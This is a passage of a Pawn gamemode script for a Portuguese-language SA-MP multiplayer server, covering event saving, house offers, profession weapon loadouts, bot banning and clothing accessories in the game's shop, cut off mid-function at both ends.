		vEvento[VeiculosEvento] = CreateVehicle(modelo, Posicao[VeiculosEvento][0], Posicao[VeiculosEvento][1], Posicao[VeiculosEvento][2], Posicao[VeiculosEvento][3], vecolor, vecolor, -1);
        ivEvento[vEvento[VeiculosEvento]] = 1;
		VeiculosEvento ++;
	}
	return fclose(arquivoFopen);
}

stock salvarRace(playerid, arquivo[])
{
	new
		string[64], formy[24], i
	;

	format(formy, 24, "eSalvos/CPS/%s.txt", arquivo);

	new
		File:example = fopen(formy, io_write)
	;

	while (i < CheckID)
	{
		format(string, sizeof(string), "%f, %f, %f\r\n", CheckPoint[i][0], CheckPoint[i][1], CheckPoint[i][2]);
		fwrite(example, string);
		++i;
	}
	fclose(example);
	format(gstring, sizeof(gstring), "O evento %s foi salvo com sucesso, para quando quiser faze-lo novamente!", arquivo);
	SendClientMessage(playerid, COR_AMARELO, gstring);
	WE_SaveFile();
	salvarVeiculos(arquivo);
	return 1;
}

stock salvarVeiculos(arquivo[])
{
	new
		string[64], formy[24]
	;
	format(formy, 24, "eSalvos/VS/%s.txt", arquivo);
	new
		File:example = fopen(formy, io_append)
	;
    for(new ve = 0; ve < MAX_VEHICLES; ++ve)
	{
		if(IsValidVehicleEvento(ve))
		{
			new
				Float:vehx, Float:vehy, Float:vehz, Float:veha
			;
			GetVehiclePos(ve, vehx, vehy, vehz);
			GetVehicleZAngle(ve, veha);
			format(string, sizeof(string), "%f, %f, %f, %f, %d\r\n", vehx, vehy, vehz, veha, GetVehicleModel(ve));
			fwrite(example, string);
		}
	}
	WE_SaveFile();
	fclose(example);
	return 1;
}

stock IsValidVehicleEvento(v)
{
    if(ivEvento[v] == 1) return true;
        else return false;
}

/*stock sscanf(string[], format[], {Float,_}:...) // By: Y_Less
{
	#if defined isnull
		if (isnull(string))
	#else
		if (string[0] == 0 || (string[0] == 1 && string[1] == 0))
	#endif
		{
			return format[0];
		}
	#pragma tabsize 4
	new
		formatPos = 0,
		stringPos = 0,
		paramPos = 2,
		paramCount = numargs(),
		delim = ' ';
	while (string[stringPos] && string[stringPos] <= ' ')
	{
		stringPos++;
	}
	while (paramPos < paramCount && string[stringPos])
	{
		switch (format[formatPos++])
		{
			case '\0':
			{
				return 0;
			}
			case 'i', 'd':
			{
				new
					neg = 1,
					num = 0,
					ch = string[stringPos];
				if (ch == '-')
				{
					neg = -1;
					ch = string[++stringPos];
				}
				do
				{
					stringPos++;
					if ('0' <= ch <= '9')
					{
						num = (num * 10) + (ch - '0');
					}
					else
					{
						return -1;
					}
				}
				while ((ch = string[stringPos]) > ' ' && ch != delim);
				setarg(paramPos,0,num * neg);
			}
			case 'h', 'x':
			{
				new
					num = 0,
					ch = string[stringPos];
				do
				{
					stringPos++;
					switch (ch)
					{
						case 'x', 'X':
						{
							num = 0;
							continue;
						}
						case '0' .. '9':
						{
							num = (num << 4) | (ch - '0');
						}
						case 'a' .. 'f':
						{
							num = (num << 4) | (ch - ('a' - 10));
						}
						case 'A' .. 'F':
						{
							num = (num << 4) | (ch - ('A' - 10));
						}
						default:
						{
							return -1;
						}
					}
				}
				while ((ch = string[stringPos]) > ' ' && ch != delim);
				setarg(paramPos,0,num);
			}
			case 'c':
			{
				setarg(paramPos,0,string[stringPos++]);
			}
			case 'f':
			{

				new changestr[16], changepos = 0, strpos = stringPos;
				while(changepos < 16 && string[strpos] && string[strpos] != delim)
				{
					changestr[changepos++] = string[strpos++];
    				}
				changestr[changepos] = '\0';
				setarg(paramPos,0,_:floatstr(changestr));
			}
			case 'p':
			{
				delim = format[formatPos++];
				continue;
			}
			case '\'':
			{
				new
					end = formatPos - 1,
					ch;
				while ((ch = format[++end]) && ch != '\'') {}
				if (!ch)
				{
					return -1;
				}
				format[end] = '\0';
				if ((ch = strfind(string, format[formatPos], false, stringPos)) == -1)
				{
					if (format[end + 1])
					{
						return -1;
					}
					return 0;
				}
				format[end] = '\'';
				stringPos = ch + (end - formatPos);
				formatPos = end + 1;
			}
			case 'u':
			{
				new
					end = stringPos - 1,
					id = 0,
					bool:num = true,
					ch;
				while ((ch = string[++end]) && ch != delim)
				{
					if (num)
					{
						if ('0' <= ch <= '9')
						{
							id = (id * 10) + (ch - '0');
						}
						else
						{
							num = false;
						}
					}
				}
				if (num && IsPlayerConnected(id))
				{
					setarg(paramPos,0,id);
				}
				else
				{
					#if !defined foreach
						#define foreach(%1,%2) for (new %2 = 0; %2 < MAX_PLAYERS; %2++) if (IsPlayerConnected(%2))
						#define SSCANF_FOREACH
					#endif
					string[end] = '\0';
					num = false;
					new
						name[MAX_PLAYER_NAME];
					id = end - stringPos;
					foreach (Player, playerid)
					{
						GetPlayerName(playerid, name, sizeof (name));
						if (!strcmp(name, string[stringPos], true, id))
						{
							setarg(paramPos,0,playerid);
							num = true;
							break;
						}
					}
					if (!num)
					{
						setarg(paramPos,0,INVALID_PLAYER_ID);
					}
					string[end] = ch;
					#if defined __SSCANF_FOREACH__
						#undef foreach
						#undef __SSCANF_FOREACH__
					#endif
				}
				stringPos = end;
			}
			case 's', 'z':
			{
				new
					i = 0,
					ch;
				if (format[formatPos])
				{
					while ((ch = string[stringPos++]) && ch != delim)
					{
						setarg(paramPos, i++, ch);
					}
					if (!i)
					{
						return -1;
					}
				}
				else
				{
					while ((ch = string[stringPos++]))
					{
						setarg(paramPos, i++, ch);
					}
				}
				stringPos--;
				setarg(paramPos, i, '\0');
			}
			default:
			{
				continue;
			}
		}
		while (string[stringPos] && string[stringPos] != delim && string[stringPos] > ' ')
		{
			stringPos++;
		}
		while (string[stringPos] && (string[stringPos] == delim || string[stringPos] <= ' '))
		{
			stringPos++;
		}
		paramPos++;
	}
	do
	{
		if ((delim = format[formatPos++]) > ' ')
		{
			if (delim == '\'')
			{
				while ((delim = format[formatPos++]) && delim != '\'') {}
			}
			else if (delim != 'z')
			{
				return delim;
			}
		}
	}
	while (delim > ' ');
	return 0;
}*/

forward MensagemMorador(playerid);
public MensagemMorador(playerid)
{
	if(MoradorCount[playerid] <= 0)
	{
	    KillTimer(T_Morador[playerid]);
		format(gstring, sizeof(gstring), "Você demorou muito, e oferta de moradia feita por %s foi cancelada!", PlayerName(MoradorCasaID[playerid]));
		SendClientMessage(playerid, COR_ERRO, gstring);
	    format(gstring, sizeof(gstring), "%s demorou muito para responder e a oferta de moradia feita por você foi cancelada!", PlayerName(playerid));
        SendClientMessage(playerid, COR_ERRO, gstring);
	    MoradorCount[playerid] = 0;
	    MoradorCasaID[playerid] = -1;
	    AceitarMorador[playerid] = 0;
	}
	else if(MoradorCount[playerid] > 0)
	{
		format(gstring, sizeof(gstring), "%s está convidando você para morar na casa dele(a), use: (/Aceitar | /Recusar)", PlayerName(MoradorCasaID[playerid]));
		SendClientMessage(playerid, AZUL_WE, gstring);
		format(gstring, sizeof(gstring), "Você está convidando %s para morar em sua casa.", PlayerName(playerid));
		SendClientMessage(MoradorCasaID[playerid], AZUL_WE, gstring);
	    T_Morador[playerid] = SetTimerEx("MensagemMorador", 4000, false, "d", playerid);
	    MoradorCount[playerid] --;
	}
	return 1;
}

GetVehicleWithinDistance(playerid, Float:x1, Float:y1, Float:z1, Float:dist, &veh)
{
    for(new i = 1; i < MAX_VEHICLES; i++)
	{
        if(GetVehicleModel(i) > 0)
		{
            if(GetPlayerVehicleID(playerid) != i)
			{
            	new Float:x, Float:y, Float:z;
            	new Float:x2, Float:y2, Float:z2;
            	GetVehiclePos(i, x, y, z);
            	x2 = x1 - x; y2 = y1 - y; z2 = z1 - z;
            	new Float:vDist = (x2*x2+y2*y2+z2*z2);
            	if(vDist < dist)
				{
            		veh = i;
            		dist = vDist;
                }
            }
        }
    }
}

IsVehicleRc(vehicleid)
{
	new
		model = GetVehicleModel(vehicleid)
  	;
  	switch(model)
  	{
  		case RC_GOBLIN, RC_BARON, RC_BANDIT, RC_RAIDER, RC_MINITANK: return 1;
  		default: return 0;
    }
  	return 0;
}

stock CriarArvore(Float:X, Float:Y, Float:Z)
{
	CreateDynamicObject(3472, X+0.28564453, Y+0.23718262, Z+27.00000000, 0.00000000, 0.00000000, 230.48021);
	CreateDynamicObject(664, X+0.20312500, Y+0.01171875, Z+-3.00000000, 0.00000000, 0.00000000, 0.00000000);
	CreateDynamicObject(3472, X+0.45312500, Y+0.51562500, Z+4.00000000, 0.00000000, 0.00000000, 69.7851562);
	CreateDynamicObject(3472, X+0.65136719, Y+1.84570312, Z+17.00000000, 0.00000000, 0.00000000, 41.863403);
	CreateDynamicObject(7666, X+0.34130859, Y+0.16845703, Z+45.00000000, 0.00000000, 0.00000000, 298.12524);
	CreateDynamicObject(7666, X+0.34082031, Y+0.16796875, Z+45.00000000, 0.00000000, 0.00000000, 27.850342);
	CreateDynamicObject(3472, X+0.45312500, Y+0.51562500, Z+12.00000000, 0.00000000, 0.00000000, 350.02441);
	CreateDynamicObject(3472, X+0.45312500, Y+0.51562500, Z+7.00000000, 0.00000000, 0.00000000, 30.0805664);
	CreateDynamicObject(3472, X+0.45312500, Y+0.51562500, Z+22.00000000, 0.00000000, 0.00000000, 230.47119);
	CreateDynamicObject(1262, X+0.15039062, Y+0.57128906, Z+29.45285416, 0.00000000, 0.00000000, 162.90527);
}

forward Novotapete(playerid);
public Novotapete(playerid)
{
    SendClientMessage(playerid, COR_AMARELO, "Você já pode criar novamente um tapete!");
	if(SpikeInfo[Crioutapete[playerid]][sCreated] == 1)
	{
		SpikeInfo[Crioutapete[playerid]][sCreated] = 0;
		SpikeInfo[Crioutapete[playerid]][sX] = 0.0;
		SpikeInfo[Crioutapete[playerid]][sY] = 0.0;
		SpikeInfo[Crioutapete[playerid]][sZ] = 0.0;
		DestroyDynamicObject(SpikeInfo[Crioutapete[playerid]][sObject]);
	}
	Crioutapete[playerid] = 0;
	return 1;
}

stock f(playerid)
{
	new
	    filePlayer[128];
    format(filePlayer, sizeof(filePlayer), "Contas/%s.ini", PlayerName(playerid));
    return filePlayer;
}

forward casaComprou(formatado[]);
public casaComprou(formatado[])
{
	if(!fexist("comprouCasaLog.txt"))
	{
	    WE_CreateFile("comprouCasaLog.txt");
	}
	new
		File:Arquivo = fopen("comprouCasaLog.txt", io_append)
	;
	format(pFile, sizeof(pFile), "%s\r\n", formatado);
	fwrite(Arquivo, pFile);
	fclose(Arquivo);
}

forward casaVendeu(formatado[]);
public casaVendeu(formatado[])
{
	if(!fexist("vendeuCasaLog.txt"))
	{
	    WE_CreateFile("vendeuCasaLog.txt");
	}
	new
		File:Arquivo = fopen("vendeuCasaLog.txt", io_append)
	;
	format(pFile, sizeof(pFile), "%s\r\n", formatado);
	fwrite(Arquivo, pFile);
	fclose(Arquivo);
}

forward desliberarEmpresa(playerid);
public desliberarEmpresa(playerid)
{
    LiberadoEmpresa[playerid] = 0;
    return 1;
}

stock SkinValida(SkinID)
{
    if ((SkinID == 3) || (SkinID == 4) || (SkinID == 5) || (SkinID == 6) || (SkinID == 8) || (SkinID == 42) || (SkinID == 65) || (SkinID == 86) || (SkinID == 119) || (SkinID == 149) || (SkinID ==208) || (SkinID == 273) || (SkinID == 289) || (SkinID == 269) || (SkinID == 270) || (SkinID == 271)) return true;
    else return false;
}

/*public OnPlayerTakeDamage(playerid, issuerid, Float:amount, weaponid)
{
    if(issuerid != INVALID_PLAYER_ID)
    {
	    new
			Float:health
		;
	    GetPlayerHealth(playerid, health);

	    new
	        Float:issx, Float:issy, Float:issz
		;
  		GetPlayerPos(issuerid, issx, issy, issz);

	    foreach(Player, i)
    	{
    		if(IsPlayerInRangeOfPoint(i, 50.0, issx, issy, issz) && ArenaDuelo[i] == false && validArmas[i] == false)
		    {
		        if(viewMM[i] < gettime())
		        {
	    			format(gStr, 128, "{FF1E1E} {FFFFFF}%s feriu %s deixando-o(a) com %.0f de vida.", PlayerName(issuerid), PlayerName(playerid), health);
		    		SendClientMessage(i, 0xFFFFFFFF, gStr);
	    		}
	    		viewMM[i] = gettime() + 2;
			}
	    }
    }
    return 1;
}*/


stock armasProf(playerid)
{
    if(epDM[playerid][dmParticipando] == 0)
    {
		if(pInfo[playerid][Prof] == POL_CIVIL)
		{
		    if(pInfo[playerid][fardado] == 0)
		    {
   				GivePlayerWeapon(playerid, 23, 500);
			}
			if(pInfo[playerid][fardado] == 1)
			{
				GivePlayerWeapon(playerid, 3, 1);
			    GivePlayerWeapon(playerid, 24, 500);
			    GivePlayerWeapon(playerid, 29, 800);
			    GivePlayerWeapon(playerid, 25, 300);
			    SetPlayerSkin(playerid, 281);
			}
		}
		if(pInfo[playerid][Prof] == POL_MILITAR)
		{
		    if(pInfo[playerid][fardado] == 0)
		    {
   				GivePlayerWeapon(playerid, 23, 500);
			}
			if(pInfo[playerid][fardado] == 1)
			{
				GivePlayerWeapon(playerid, 3, 1);
			    GivePlayerWeapon(playerid, 24, 500);
			    GivePlayerWeapon(playerid, 29, 800);
			    GivePlayerWeapon(playerid, 25, 300);
			    GivePlayerWeapon(playerid, 31, 800);
			    SetPlayerSkin(playerid, 280);
			}
		}
		if(pInfo[playerid][Prof] == POL_FEDERAL)
		{
		    if(pInfo[playerid][fardado] == 0)
		    {
   				GivePlayerWeapon(playerid, 23, 500);
			}
			if(pInfo[playerid][fardado] == 1)
			{
				GivePlayerWeapon(playerid, 3, 1);
			    GivePlayerWeapon(playerid, 24, 500);
			    GivePlayerWeapon(playerid, 29, 800);
			    GivePlayerWeapon(playerid, 27, 250);
			    GivePlayerWeapon(playerid, 31, 800);
			    GivePlayerWeapon(playerid, 34, 100);
			    SetPlayerSkin(playerid, 286);
			}
		}
		if(pInfo[playerid][Prof] == POL_RODOVIARIO)
		{
		    if(pInfo[playerid][fardado] == 0)
		    {
   				GivePlayerWeapon(playerid, 23, 500);
			}
			if(pInfo[playerid][fardado] == 1)
			{
				GivePlayerWeapon(playerid, 3, 1);
			    GivePlayerWeapon(playerid, 22, 500);
			    GivePlayerWeapon(playerid, 29, 800);
			    GivePlayerWeapon(playerid, 25, 300);
			    SetPlayerSkin(playerid, 282);
			}
		}
	    if(pInfo[playerid][Prof] == GUARDA_TRANSITO)
		{
		    if(pInfo[playerid][fardado] == 0)
		    {
   				GivePlayerWeapon(playerid, 23, 500);
			}
			if(pInfo[playerid][fardado] == 1)
			{
				GivePlayerWeapon(playerid, 3, 1);
			    GivePlayerWeapon(playerid, 22, 500);
			    GivePlayerWeapon(playerid, 25, 300);
			    SetPlayerSkin(playerid, 71);
			}
		}
		if(pInfo[playerid][Prof] == FOTOGRAFO)
		{
		    GivePlayerWeapon(playerid, 43, 500);
		}
		if(pInfo[playerid][Prof] == PROSTITUTA)
		{
			GivePlayerWeapon(playerid, 10, 1);
		}
		if(pInfo[playerid][Prof] == HITMAN)
		{
		    GivePlayerWeapon(playerid, 34, 100);
		    GivePlayerWeapon(playerid, 31, 500);
		    GivePlayerWeapon(playerid, 23, 150);
		}
		if(pInfo[playerid][Prof] == TRAF_DROGAS)
		{
		    GivePlayerWeapon(playerid, 30, 100);
		}
		if(pInfo[playerid][Prof] == TRAF_ARMAS)
		{
		    GivePlayerWeapon(playerid, 30, 100);
		    GivePlayerWeapon(playerid, 25, 100);
		}
		if(pInfo[playerid][Prof] == ATIRADOR)
		{
		    GivePlayerWeapon(playerid, 34, 50);
		}
		if(pInfo[playerid][Prof] == TERRORISTA)
		{
		    GivePlayerWeapon(playerid, 39, 7);
		    GivePlayerWeapon(playerid, 40, 1);
		}
		if(pInfo[playerid][Prof] == CHEFE_MAFIA)
		{
		    GivePlayerWeapon(playerid, 1, 1);
		    GivePlayerWeapon(playerid, 4, 1);
		    GivePlayerWeapon(playerid, 24, 150);
		    GivePlayerWeapon(playerid, 31, 450);
		}
	}
}

stock resetNeon(playerid)
{
	DestroyDynamicObject(GetPVarInt(playerid, "neon"));
	DeletePVar(playerid, "Status");
	DestroyDynamicObject(GetPVarInt(playerid, "neon1"));
	DeletePVar(playerid, "Status");
	DestroyDynamicObject(GetPVarInt(playerid, "neon2"));
	DeletePVar(playerid, "Status");
	DestroyDynamicObject(GetPVarInt(playerid, "neon3"));
	DeletePVar(playerid, "Status");
	DestroyDynamicObject(GetPVarInt(playerid, "neon4"));
	DeletePVar(playerid, "Status");
	DestroyDynamicObject(GetPVarInt(playerid, "neon5"));
	DeletePVar(playerid, "Status");
	DestroyDynamicObject(GetPVarInt(playerid, "neon6"));
	DeletePVar(playerid, "Status");
	DestroyDynamicObject(GetPVarInt(playerid, "neon7"));
	DeletePVar(playerid, "Status");
	DestroyDynamicObject(GetPVarInt(playerid, "neon8"));
	DeletePVar(playerid, "Status");
	DestroyDynamicObject(GetPVarInt(playerid, "neon9"));
	DeletePVar(playerid, "Status");
	DestroyDynamicObject(GetPVarInt(playerid, "neon10"));
	DeletePVar(playerid, "Status");
	DestroyDynamicObject(GetPVarInt(playerid, "neon11"));
	DeletePVar(playerid, "Status");
	DestroyDynamicObject(GetPVarInt(playerid, "neon12"));
	DeletePVar(playerid, "Status");
	DestroyDynamicObject(GetPVarInt(playerid, "neon13"));
	DeletePVar(playerid, "Status");
	DestroyDynamicObject(GetPVarInt(playerid, "interior"));
	DeletePVar(playerid, "Status");
	DestroyDynamicObject(GetPVarInt(playerid, "interior1"));
	DeletePVar(playerid, "Status");
	DestroyDynamicObject(GetPVarInt(playerid, "back"));
	DeletePVar(playerid, "Status");
	DestroyDynamicObject(GetPVarInt(playerid, "back1"));
	DeletePVar(playerid, "Status");
	DestroyDynamicObject(GetPVarInt(playerid, "front"));
	DeletePVar(playerid, "Status");
	DestroyDynamicObject(GetPVarInt(playerid, "front1"));
	DeletePVar(playerid, "Status");
	DestroyDynamicObject(GetPVarInt(playerid, "undercover"));
	DeletePVar(playerid, "Status");
	DestroyDynamicObject(GetPVarInt(playerid, "undercover1"));
	DeletePVar(playerid, "Status");
}

stock Float:GetPointAngleToPoint(Float:x2, Float:y2, Float:X, Float:Y)
{
	new Float:DX, Float:DY;
	new Float:angle;

	DX = floatabs(floatsub(x2,X));
	DY = floatabs(floatsub(y2,Y));

	if (DY == 0.0 || DX == 0.0)
	{
		if(DY == 0 && DX > 0) angle = 0.0;
		else if(DY == 0 && DX < 0) angle = 180.0;
		else if(DY > 0 && DX == 0) angle = 90.0;
		else if(DY < 0 && DX == 0) angle = 270.0;
		else if(DY == 0 && DX == 0) angle = 0.0;
	}
	else
	{
		angle = atan(DX/DY);

		if(X > x2 && Y <= y2) angle += 90.0;
		else if(X <= x2 && Y < y2) angle = floatsub(90.0, angle);
		else if(X < x2 && Y >= y2) angle -= 90.0;
		else if(X >= x2 && Y > y2) angle = floatsub(270.0, angle);
	}
	return floatadd(angle, 90.0);
}

stock verEmpresa(playerid)
{
	if(WE_GetInt(f(playerid), "Contratado") != 0)
	{
        if(!strcmp(EmpresaInfo[WE_GetInt(f(playerid), "Contratado")][Funcionario1], PlayerName(playerid), false) && !strcmp(EmpresaInfo[WE_GetInt(f(playerid), "Contratado")][Funcionario2], PlayerName(playerid), false) && !strcmp(EmpresaInfo[WE_GetInt(f(playerid), "Contratado")][Funcionario3], PlayerName(playerid), false))
        {
			WE_GetInt(f(playerid), "Contratado", 0);
        }
	}
}

stock CountIP(ip[])
{
	new
		c = 0
	;
	foreach(Player, i) if(!strcmp(GetIP(i), ip)) c++;
	return c;
}

stock GetIP(playerid)
{
	new
		ip[16]
	;
	GetPlayerIp(playerid, ip, sizeof(ip));
	return ip;
}

stock BanAll(playerid)
{
	new
		ip[32]
	;
	GetPlayerIp(playerid, ip, sizeof(ip));

	foreach(Player, i)
	{
		new
			p = GetPlayerPing(i)
		;
		if(i == playerid || !strcmp(ip, GetIP(i)) || p <= 0 || p >= 30000)
		{
		    new
		        formy[128]
			;
			format(formy, sizeof(formy), "Contas/%s.ini", PlayerName(i));
			if(!fexist(formy))
			{
				BanEx(i, "Bot");
			}
		}
	}
 	format(ip, sizeof(ip), "banip %s", ip);
	return SendRconCommand(ip);
}

forward ItenOpcao(playerid);
public ItenOpcao(playerid)
{
	if(useTipo[playerid] == 1)
	{
	    ShowPlayerDialog(playerid, D_ITEN1, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Loja de Roupas", "Você deseja comprar esse óculos?", "Sim", "Não");
	    return 1;
	}
	else if(useTipo[playerid] == 2)
	{
	    ShowPlayerDialog(playerid, D_ITEN2, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Loja de Roupas", "Você deseja comprar esse máscara?", "Sim", "Não");
	    return 1;
	}
	else if(useTipo[playerid] == 4)
	{
	    ShowPlayerDialog(playerid, D_ITEN4, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Loja de Roupas", "Você deseja comprar esse chapéu?", "Sim", "Não");
	    return 1;
	}
	return 1;
}

stock SetPlayerOculos(playerid, oculosx)
{
	if(oculosx == 1)
	{
		SetPlayerAttachedObject(playerid, 1, 19006, 2, 0.09, 0.04,0,88, 75, 0);
	}
	else if(oculosx == 2)
	{
		SetPlayerAttachedObject(playerid, 1, 19007, 2, 0.09, 0.04,0,88, 75, 0);
	}
	else if(oculosx == 3)
	{
		SetPlayerAttachedObject(playerid, 1, 19008, 2, 0.09, 0.04,0,88, 75, 0);
	}
	else if(oculosx == 4)
	{
		SetPlayerAttachedObject(playerid, 1, 19009, 2, 0.09, 0.04,0,88, 75, 0);
	}
	else if(oculosx == 5)
	{
		SetPlayerAttachedObject(playerid, 1, 19010, 2, 0.09, 0.04,0,88, 75, 0);
	}
	else if(oculosx == 6)
	{
		SetPlayerAttachedObject(playerid, 1, 19011, 2, 0.09, 0.04,0,88, 75, 0);
	}
	else if(oculosx == 7)
	{
		SetPlayerAttachedObject(playerid, 1, 19012, 2, 0.09, 0.04,0,88, 75, 0);
	}
	else if(oculosx == 8)
	{
		SetPlayerAttachedObject(playerid, 1, 19013, 2, 0.09, 0.04,0,88, 75, 0);
	}
	else if(oculosx == 9)
	{
		SetPlayerAttachedObject(playerid, 1, 19014, 2, 0.09, 0.04,0,88, 75, 0);
	}
	else if(oculosx == 10)
	{
		SetPlayerAttachedObject(playerid, 1, 19015, 2, 0.09, 0.04,0,88, 75, 0);
	}
	else if(oculosx == 11)
	{
		SetPlayerAttachedObject(playerid, 1, 19016, 2, 0.09, 0.04,0,88, 75, 0);
	}
	else if(oculosx == 12)
	{
		SetPlayerAttachedObject(playerid, 1, 19017, 2, 0.09, 0.04,0,88, 75, 0);
	}
	else if(oculosx == 13)
	{
		SetPlayerAttachedObject(playerid, 1, 19018, 2, 0.09, 0.04,0,88, 75, 0);
	}
	else if(oculosx == 14)
	{
		SetPlayerAttachedObject(playerid, 1, 19019, 2, 0.09, 0.04,0,88, 75, 0);
	}
	else if(oculosx == 15)
	{
		SetPlayerAttachedObject(playerid, 1, 19020, 2, 0.09, 0.04,0,88, 75, 0);
	}
	else if(oculosx == 16)
	{
		SetPlayerAttachedObject(playerid, 1, 19021, 2, 0.09, 0.04,0,88, 75, 0);
	}
	else if(oculosx == 17)
	{
		SetPlayerAttachedObject(playerid, 1, 19022, 2, 0.09, 0.04,0,88, 75, 0);
	}
	else if(oculosx == 18)
	{
		SetPlayerAttachedObject(playerid, 1, 19023, 2, 0.09, 0.04,0,88, 75, 0);
	}
	else if(oculosx == 19)
	{
		SetPlayerAttachedObject(playerid, 1, 19024, 2, 0.09, 0.04,0,88, 75, 0);
	}
	else if(oculosx == 20)
	{
		SetPlayerAttachedObject(playerid, 1, 19025, 2, 0.09, 0.04,0,88, 75, 0);
	}
	else if(oculosx == 21)
	{
		SetPlayerAttachedObject(playerid, 1, 19026, 2, 0.09, 0.04,0,88, 75, 0);
	}
	else if(oculosx == 22)
	{
		SetPlayerAttachedObject(playerid, 1, 19027, 2, 0.09, 0.04,0,88, 75, 0);
	}
	else if(oculosx == 23)
	{
		SetPlayerAttachedObject(playerid, 1, 19028, 2, 0.09, 0.04,0,88, 75, 0);
	}
	else if(oculosx == 24)
	{
		SetPlayerAttachedObject(playerid, 1, 19029, 2, 0.09, 0.04,0,88, 75, 0);
	}
	else if(oculosx == 25)
	{
		SetPlayerAttachedObject(playerid, 1, 19030, 2, 0.09, 0.04,0,88, 75, 0);
	}
	else if(oculosx == 26)
	{
		SetPlayerAttachedObject(playerid, 1, 19031, 2, 0.09, 0.04,0,88, 75, 0);
	}
	else if(oculosx == 27)
	{
		SetPlayerAttachedObject(playerid, 1, 19032, 2, 0.09, 0.04,0,88, 75, 0);
	}
	else if(oculosx == 28)
	{
		SetPlayerAttachedObject(playerid, 1, 19033, 2, 0.09, 0.04,0,88, 75, 0);
	}
	else if(oculosx == 29)
	{
		SetPlayerAttachedObject(playerid, 1, 19034, 2, 0.09, 0.04,0,88, 75, 0);
	}
	else if(oculosx == 30)
	{
		SetPlayerAttachedObject(playerid, 1, 19035, 2, 0.09, 0.04,0,88, 75, 0);
	}
}

stock SetPlayerMascara(playerid, mascarax)
{
	if(mascarax == 1)
	{
		SetPlayerAttachedObject(playerid, 2, 19036, 2, 0.107, 0.020, 0.0, 90, 90, 0);
	}
	else if(mascarax == 2)
	{
		SetPlayerAttachedObject(playerid, 2, 19037, 2, 0.107, 0.020, 0.0, 90, 90, 0);
	}
	else if(mascarax == 3)
	{
		SetPlayerAttachedObject(playerid, 2, 19038, 2, 0.107, 0.020, 0.0, 90, 90, 0);
	}
	else if(mascarax == 4)
	{
		SetPlayerAttachedObject(playerid, 2, 18974, 2, 0.098, 0.0258, 0.0, 90, 90, 0);
	}
	else if(mascarax == 5)
	{
		SetPlayerAttachedObject(playerid, 2, 18952, 2, 0.105, 0.01, 0.0,0,0, 0);
	}
	else if(mascarax == 6)
	{
		SetPlayerAttachedObject(playerid, 2, 19036, 2, 0.107, 0.020, 0.0, 90, 90, 0);
	}
}

stock SetPlayerChapeu(playerid, chapeux)
{
	if(chapeux == 1)
	{
		SetPlayerAttachedObject(playerid, 4, 18944, 2, 0.15, 0.0,0,180,0,10);
	}
	else if(chapeux == 2)
	{
		SetPlayerAttachedObject(playerid, 4, 18945, 2, 0.15, 0.0,0,180,0,10);
	}
	else if(chapeux == 3)
	{
		SetPlayerAttachedObject(playerid, 4, 18946, 2, 0.15, 0.0,0,180,0,10);
	}
	else if(chapeux == 4)
	{
		SetPlayerAttachedObject(playerid, 4, 18947, 2, 0.15, 0.0,0,180,0,10);
	}
	else if(chapeux == 5)
	{
		SetPlayerAttachedObject(playerid, 4, 18948, 2, 0.15, 0.0,0,180,0,10);
	}
	else if(chapeux == 6)
	{
		SetPlayerAttachedObject(playerid, 4, 18949, 2, 0.15, 0.0,0,180,0,10);
	}
	else if(chapeux == 7)
	{
		SetPlayerAttachedObject(playerid, 4, 18950, 2, 0.15, 0.0,0,180,0,10);
	}
	else if(chapeux == 8)
	{
		SetPlayerAttachedObject(playerid, 4, 18951, 2, 0.15, 0.0,0,180,0,10);
	}
	else if(chapeux == 9)
	{
		SetPlayerAttachedObject(playerid, 4, 18921, 2, 0.15, -0.03, 0.01, 180,0,30);
	}
	else if(chapeux == 10)
	{
		SetPlayerAttachedObject(playerid, 4, 18922, 2, 0.15, -0.03, 0.01, 180,0,30);
	}
	else if(chapeux == 11)
	{
		SetPlayerAttachedObject(playerid, 4, 18923, 2, 0.15, -0.03, 0.01, 180,0,30);
	}
	else if(chapeux == 12)
	{
		SetPlayerAttachedObject(playerid, 4, 18924, 2, 0.15, -0.03, 0.01, 180,0,30);
	}
	else if(chapeux == 13)
	{
		SetPlayerAttachedObject(playerid, 4, 18925, 2, 0.15, -0.03, 0.01, 180,0,30);
	}
	else if(chapeux == 14)
	{
		SetPlayerAttachedObject(playerid, 4, 18939, 2, 0.17, -0.03, 0.01, 180,0,30);
	}
	else if(chapeux == 15)
	{
		SetPlayerAttachedObject(playerid, 4, 18940, 2, 0.17, -0.03, 0.01, 180,0,30);
	}
	else if(chapeux == 16)
	{
		SetPlayerAttachedObject(playerid, 4, 18941, 2, 0.17, -0.03, 0.01, 180,0,30);
	}
	else if(chapeux == 17)
	{
		SetPlayerAttachedObject(playerid, 4, 18942, 2, 0.17, -0.03, 0.01, 180,0,30);
	}
	else if(chapeux == 18)
	{
		SetPlayerAttachedObject(playerid, 4, 18943, 2, 0.17, -0.03, 0.01, 180,0,30);
	}
	else if(chapeux == 19)
	{
		SetPlayerAttachedObject(playerid, 4, 18953, 2, 0.13, -0.03, 0.00, 180,0,30);
	}
	else if(chapeux == 20)
	{
		SetPlayerAttachedObject(playerid, 4, 18954, 2, 0.13, -0.03, 0.00, 180,0,30);
	}
	else if(chapeux == 21)
	{
		SetPlayerAttachedObject(playerid, 4, 18960, 2, 0.13,0,0, 88, 75, 0);
	}
	else if(chapeux == 22)
	{
		SetPlayerAttachedObject(playerid, 4, 18961, 2, 0.14,0,0, 88, 75, 0);
	}
	else if(chapeux == 23)
	{
		SetPlayerAttachedObject(playerid, 4, 18962, 2, 0.14,0,0, 88, 75, 0);
	}
	else if(chapeux == 24)
	{
		SetPlayerAttachedObject(playerid, 4, 18964, 2, 0.125, 0.015,0,90, 100, 0);
	}
	else if(chapeux == 25)
	{
		SetPlayerAttachedObject(playerid, 4, 18965, 2, 0.125, 0.015,0,90, 100, 0);
	}
	else if(chapeux == 26)
	{
		SetPlayerAttachedObject(playerid, 4, 18966, 2, 0.125, 0.015,0,90, 100, 0);
	}
	else if(chapeux == 27)
	{
		SetPlayerAttachedObject(playerid, 4, 18967, 2, 0.125, 0.015,0,90, 80, 0);
	}
	else if(chapeux == 28)
	{
		SetPlayerAttachedObject(playerid, 4, 18968, 2, 0.125, 0.015,0,90, 80, 0);
	}
	else if(chapeux == 29)
	{
		SetPlayerAttachedObject(playerid, 4, 18969, 2, 0.125, 0.015,0,90, 80, 0);
	}
	else if(chapeux == 30)
	{
